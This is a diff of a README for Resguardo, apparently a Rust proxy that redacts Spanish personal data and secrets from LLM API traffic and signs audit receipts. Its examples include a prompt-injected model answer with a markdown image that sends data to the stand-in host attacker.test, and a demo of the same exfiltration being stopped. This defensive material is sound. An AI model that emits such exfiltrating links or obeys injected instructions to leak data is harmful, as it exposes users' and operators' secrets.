@@ -25,91 +25,14 @@
 
 Every prompt your application sends to a model provider leaves your network. It may carry customer data, an API key pasted into a support chat, or whatever a prompt injection convinced an agent to read. Most teams cannot answer two simple questions: **what left, and who allowed it?**
 
-Resguardo is a single Rust binary that sits between your applications and the OpenAI and Anthropic APIs, or any OpenAI-compatible server (LiteLLM, vLLM, Ollama). Applications keep their official SDKs: change the base URL and the key, nothing else.
+Resguardo is a single Rust binary between your applications and the OpenAI and Anthropic APIs, or any OpenAI-compatible server (LiteLLM, vLLM, Ollama). Applications keep their official SDKs: change the base URL and the key, nothing else. Resguardo blocks or redacts what must not leave, and signs a receipt for every decision.
 
 > [!WARNING]
-> **v0.1, not yet released.** Everything is tested end to end with the official SDKs against a mock provider, but Resguardo has not been used in production. Read the [limits](#limits) before relying on it.
-
-## Highlights
-
-- 🔒 **Closed by default.** Only listed providers and models get through, applications never see a real provider key, and any internal error blocks the request.
-- 🧾 **A signed receipt for every decision.** A hash-chained, Ed25519-signed log that anyone can verify with the public key. It records decisions, never prompt content.
-- 🇪🇸 **Spanish data, validated.** DNI, NIE, CIF, IBAN and cards are detected only when their check digit is valid, with false-positive rates measured on a Spanish corpus and [published](docs/ACCURACY.md).
-- 🛡️ **Security first.** No `unsafe`, strict parsing so the scanner and the provider never read different values, post-quantum TLS to the provider, and remote images and unknown links removed from answers.
-- ⚡ **One small binary.** No database and no runtime services: a TOML file, a JSONL log and a key pair.
-
-## How it works
-
-```mermaid
-flowchart LR
-    App["Your app<br/>(no direct internet)"] -- "virtual key rsg_…" --> R
-    subgraph R["resguardo"]
-        direction LR
-        I[Identity] --> S[Scan] --> P[Policy] --> A[Receipt] --> E[Egress]
-    end
-    E -- "real key, verified TLS" --> M["OpenAI · Anthropic<br/>OpenAI-compatible"]
-    M -. "streamed response, scanned" .-> App
-    A --> L[("Signed audit log")]
-```
-
-From the application's side, only two lines change:
-
-```python
-from openai import OpenAI
-
-client = OpenAI(
-    base_url="http://127.0.0.1:8787/v1",  # Resguardo instead of api.openai.com
-    api_key="rsg_...",                     # a virtual key instead of the real one
-)
-client.chat.completions.create(
-    model="gpt-4.1-mini",
-    messages=[{"role": "user", "content": "Mi DNI es 12345678Z"}],
-)
-```
-
-The provider receives `Mi DNI es [REDACTED:es_id:1]`, and a signed receipt records the decision.
-
-## What happens to a request
-
-| The application sends… | Resguardo… | The receipt says |
-| --- | --- | --- |
-| `hola, ¿cómo va mi pedido 12345678?` | forwards it byte for byte | `allow` |
-| `Mi DNI es 12345678Z` | forwards `Mi DNI es [REDACTED:es_id:1]` | `redact`, `{"es_id": 1}` |
-| `my key is AKIA…` | answers `403 SENSITIVE_DATA`; nothing leaves | `block`, `secret` |
-| a model that is not on the key's list | answers `403 MODEL_NOT_ALLOWED`; nothing leaves | `block` |
-| anything, while the disk is full | answers `503 AUDIT_UNAVAILABLE`; nothing leaves | — |
-
-| The model answers… | The application gets… |
-| --- | --- |
-| `Done ![x](https://attacker.test/?d=…)`, after a prompt injection | `Done [image removed]` |
-| `[docs](https://unknown.test/…)` | `docs`; links to hosts on the allowlist stay |
-| a provider key, split across two stream events | the stream cut with an error event |
-
-Every decision is a line in a hash-chained, signed log. `resguardo verify-log` checks it with the public key, and the log never holds prompt content.
-
-## Try it
-
-```console
-$ git clone https://github.com/christianivanov/resguardo && cd resguardo
-$ tools/sdk-smoke/run.sh
-ok   openai: chat completion through Resguardo
-ok   anthropic: message with the key in x-api-key
-ok   anthropic: message with the key as a bearer token
-ok   openai: unknown key -> AuthenticationError
-ok   openai: model outside the list -> PermissionDeniedError
-...
-ok   openai: a DNI reaches the provider redacted  (echo: Mi DNI es [REDACTED:es_id:1])
-ok   openai: an AWS key -> PermissionDeniedError
-...
-ok   no virtual key reached the upstream
-ok   audit log verifies: OK (30 entries)
-```
-
-One command starts a mock provider and Resguardo, then calls them with the official OpenAI and Anthropic SDKs. It needs Rust, a C compiler and [uv](https://docs.astral.sh/uv/). No API key is needed, and no real provider is contacted. For a step-by-step walkthrough, see [Getting started](docs/GETTING_STARTED.md).
+> **v0.1, not yet released.** Tested end to end with the official SDKs against a mock provider; not yet used in production. Read the [limits](#limits) first.
 
 ## See it stop an exfiltration
 
-[`lab/local-demo.sh`](lab/local-demo.sh) runs the same attack twice on your machine: through a real `resguardo run`, and straight to the provider. This is its actual output:
+The same attack twice, on one machine: first through Resguardo (port 18788), then straight to the provider (port 19100). This is the unedited output of [`lab/local-demo.sh`](lab/local-demo.sh):
 
 ```console
 $ lab/local-demo.sh
@@ -127,24 +50,106 @@ LEAK the answer carries an image that sends data to the attacker
 
 == receipts
 audit.jsonl: OK (6 entries)
+== exit codes: protected 0, unprotected 1
 ```
 
-The [Docker lab](lab/README.md) adds what a laptop cannot show: the application sits on a network whose only way out is Resguardo, and the attacker logs what reaches it. It has not been run for this release yet.
+The [Docker lab](lab/README.md) adds what one machine cannot show: the application sits on a network whose only way out is Resguardo. It has not been run for this release yet.
+
+## Who it is for
+
+- **A support bot or internal assistant** that sends customer messages to OpenAI or Anthropic. Customers paste their DNI, IBAN or phone number; the provider gets `[REDACTED:es_id:1]`.
+- **Coding agents** such as Claude Code, which read files and can send a `.env` to the model without anyone noticing. Provider keys and tokens are blocked before they leave.
+- **Teams that must show what left.** A security or compliance team, or a data protection officer, can check every decision with a public key, without trusting the operator's word or database.
+
+## What happens to a request
+
+| The application sends… | Resguardo… | The receipt says |
+| --- | --- | --- |
+| `hola, ¿cómo va mi pedido 12345678?` | forwards it byte for byte | `allow` |
+| `Mi DNI es 12345678Z` | forwards `Mi DNI es [REDACTED:es_id:1]` | `redact`, `{"es_id": 1}` |
+| `my key is AKIA…` | answers `403 SENSITIVE_DATA`; nothing leaves | `block`, `secret` |
+| a model that is not on the key's list | answers `403 MODEL_NOT_ALLOWED`; nothing leaves | `block` |
+| anything, while the disk is full | answers `503 AUDIT_UNAVAILABLE`; nothing leaves | — |
+
+| The model answers… | The application gets… |
+| --- | --- |
+| `Done ![x](https://attacker.test/?d=…)`, after a prompt injection | `Done [image removed]` |
+| `[docs](https://unknown.test/…)` | `docs`; links to hosts on the allowlist stay |
+| a provider key, split across two stream events | the stream cut with an error event |
+
+Every decision is a line in a hash-chained, Ed25519-signed log that never holds prompt content. `resguardo verify-log` checks it with the public key.
+
+## Try it
+
+No API key is needed and no real provider is contacted: everything runs against a mock provider. You need Rust, a C compiler and, for the SDK test, [uv](https://docs.astral.sh/uv/). The first build takes a few minutes.
+
+```console
+$ git clone https://github.com/christianivanov/resguardo && cd resguardo
+$ lab/local-demo.sh              # the attack above, with and without Resguardo
+$ tools/sdk-smoke/run.sh         # the official OpenAI and Anthropic SDKs through Resguardo
+ok   openai: chat completion through Resguardo
+ok   anthropic: message with the key in x-api-key
+...
+ok   openai: a DNI reaches the provider redacted  (echo: Mi DNI es [REDACTED:es_id:1])
+ok   openai: an AWS key -> PermissionDeniedError
+...
+ok   audit log verifies: OK (30 entries)
+```
+
+To set it up step by step, with your own configuration and keys, see [Getting started](docs/GETTING_STARTED.md).
+
+## How it works
+
+```mermaid
+flowchart LR
+    App["Your app<br/>(no direct internet)"] -- "virtual key rsg_…" --> R
+    subgraph R["resguardo"]
+        direction LR
+        I[Identity] --> S[Scan] --> P[Policy] --> A[Receipt] --> E[Egress]
+    end
+    E -- "real key, verified TLS" --> M["OpenAI · Anthropic<br/>OpenAI-compatible"]
+    M -. "response, scanned" .-> App
+    A --> L[("Signed audit log")]
+```
+
+From the application's side, only two lines change:
+
+```python
+from openai import OpenAI
+
+client = OpenAI(
+    base_url="http://127.0.0.1:8787/v1",  # Resguardo instead of api.openai.com
+    api_key="rsg_...",                     # a virtual key instead of the real one
+)
+```
+
+- 🔒 **Closed by default.** Only listed providers and models get through, the application never holds a real provider key, and any internal error blocks the request.
+- 🧾 **A signed receipt for every decision,** flushed to disk before anything leaves. Anyone verifies the log with the public key.
+- 🇪🇸 **Spanish data, validated.** DNI, NIE, CIF, IBAN and cards count only when their check digit is valid, also when hidden in Base64, full-width digits or zero-width characters.
+- 🛡️ **Security first.** No `unsafe`; strict parsing, so the scanner and the provider never read different values; post-quantum TLS to the provider; requests without findings forwarded byte for byte, so prompt caching keeps working.
+- ⚡ **One small binary.** No database and no services to run: a TOML file, a JSONL log and a key pair.
 
 ## Accuracy and cost
 
-Measured on a synthetic Spanish corpus of 406 texts and on a 2017 laptop; both reproduce with one command ([accuracy](docs/ACCURACY.md), [benchmarks](docs/BENCHMARKS.md)).
+Both reproduce with one command: [`resguardo accuracy`](docs/ACCURACY.md) and [`resguardo-bench`](docs/BENCHMARKS.md).
 
-| | |
+**Accuracy,** on a synthetic Spanish corpus of 406 texts (306 that look sensitive and are not):
+
+| Class | False positives | Missed |
+| --- | --- | --- |
+| Spanish ids (DNI, NIE, CIF) | 0.3 % | 3 of 39, all a known gap: an id glued to letters |
+| IBAN, email, provider keys | 0 % | 0 |
+| Cards | 0.7 % | 0 |
+| Phones | 2.9 %, all of them ISBNs | 0 |
+
+**Cost,** per request, measured on a 2017 MacBook Pro against a local mock:
+
+| | p50 |
 | --- | --- |
-| False positives, Spanish ids (DNI, NIE, CIF) | 0.3 % of 306 negatives |
-| False positives, IBAN, email, secrets | 0 % |
-| False positives, cards / phones | 0.7 % / 2.9 % |
-| Missed | 3 of 100 positives, all a known gap (an id glued to letters) |
-| Latency added, receipt flushed to disk (`fsync`) | 10.7 ms p50, dominated by this laptop's disk |
-| Latency added, without `fsync` | 0.5 ms p50 |
+| What Resguardo adds: parsing, scanning, policy, signing the receipt, the extra hop | **0.5 ms** |
+| The same, flushing the receipt to disk before the request leaves (`fsync`, on by default) | **10.7 ms** on this laptop |
 
-`resguardo accuracy --baseline fixtures/accuracy/baseline.json` fails if any detector gets worse than these numbers.
+The difference is one disk flush per request: the price of "the receipt is on disk before anything leaves". It depends on your disk, not on Resguardo. Throughput under concurrency is not measured yet. `resguardo accuracy --baseline fixtures/accuracy/baseline.json` fails if any detector gets worse than the numbers above.
 
 ## How it compares
 
